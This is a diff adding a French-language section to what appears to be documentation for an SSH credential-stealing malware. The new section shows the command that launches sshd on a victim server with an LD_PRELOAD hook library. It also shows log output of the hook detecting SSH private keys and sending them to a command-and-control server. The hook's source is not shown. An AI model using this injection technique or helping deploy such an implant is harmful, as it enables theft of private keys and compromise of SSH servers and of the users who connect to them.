@@ -92,6 +92,29 @@ Sortie attendue :
 
 ---
 
+
+### **6. Exemple de capture et d'envoi au C2
+Lorsqu'un utilisateur se connecte à un serveur SSH infecté, le malware intercepte ses informations et les envoie au serveur C2. Voici un exemple de sortie lors de la capture d'une clé privée SSH :
+ 
+sortie attendue :
+
+Sur la machine victime (serveur SSH infecté) :
+
+```bash
+sudo LD_PRELOAD=$(pwd)/hook.so /usr/sbin/sshd -D
+```
+
+🔹 Une fois la connexion SSH détectée, le malware intercepte la clé :
+
+```bash
+[hook_read] fd=7, 2590 octets lus
+[hook_read] Clé SSH détectée ! Envoi au C2...
+[hook_read] fd=7, 505 octets lus
+[hook_read] Clé SSH détectée ! Envoi au C2...
+
+```
+
+
 ## **Tests & Résultats**
 
 ### **1. Capture des Credentials**
